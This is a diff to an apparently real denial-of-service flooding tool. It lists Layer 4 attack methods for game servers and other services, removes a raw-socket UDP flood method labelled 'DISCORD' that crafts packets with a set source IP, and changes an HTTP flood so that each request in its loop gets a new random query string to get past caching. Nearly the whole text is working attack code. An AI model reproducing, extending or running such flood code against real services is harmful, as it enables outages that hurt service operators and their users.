@@ -128,7 +128,7 @@ class Methods:
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                 "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
-                                "TS3", "MCPE", "ICMP", "DISCORD", "OVH-UDP",
+                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -402,7 +402,6 @@ class Layer4(Thread):
             "FIVEM": self.FIVEM,
             "FIVEM-TOKEN": self.FIVEMTOKEN,
             "OVH-UDP": self.OVHUDP, 
-            "DISCORD": self.DISCORD,
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
@@ -538,14 +537,6 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
-    def DISCORD(self) -> None:
-        payload = self._generate_discord()
-        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target):
-                continue
-        Tools.safe_close(s)
-
     def FIVEMTOKEN(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
 
@@ -625,18 +616,6 @@ class Layer4(Thread):
             packets.append(ip.get_packet())
 
         return packets
-
-    def _generate_discord(self) -> bytes:
-        ip: IP = IP()
-        ip.set_ip_src(__ip__)
-        ip.set_ip_dst(self._target[0])
-        udp: UDP = UDP()
-        udp.set_uh_sport(ProxyTools.Random.rand_int(32768, 65535))
-        udp.set_uh_dport(self._target[1])
-        payload_data = bytes([ProxyTools.Random.rand_int(0, 255) for _ in range(40)])
-        udp.contains(Data(payload_data))
-        ip.contains(udp)
-        return ip.get_packet()
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
@@ -1174,7 +1153,10 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
@@ -1190,9 +1172,6 @@ class HttpFlood(Thread):
                              'Sec-Gpc: 1\r\n'
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
